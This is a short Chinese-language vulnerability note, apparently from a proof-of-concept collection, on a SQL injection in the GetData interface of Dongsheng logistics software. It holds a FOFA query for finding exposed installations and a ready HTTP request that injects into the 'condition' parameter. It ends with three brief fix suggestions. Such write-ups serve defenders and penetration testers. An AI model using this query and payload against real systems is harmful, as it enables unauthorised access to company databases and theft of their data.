# 东胜物流软件GetData接口SQL注入漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 东胜物流软件GetData接口SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | MsAnmoumce/GetData |
| 影响版本 | 东胜物流软件 |

## 漏洞概述

东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。GetData接口存在SQL注入漏洞。

## fofa查询语句

```
body="FeeCodes/CompanysAdapter.aspx"||body="dhtmlxcombo_whp.js"||body="dongshengsoft"||body="theme/dhtmlxcombo.css"
```

## 漏洞复现

### POC

```http
GET /MvcShipping/MsAnmoumce/GetData?handle=edit&condition=1+<@@VERSION HTTP/1.1
Host: target.com
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
```

### 漏洞特征

- 路径：/MvcShipping/MsAnmoumce/GetData
- 参数：handle, condition
- HTTP方法：GET

## 修复建议

1. 打补丁
2. 使用参数化查询
3. 实施严格输入验证
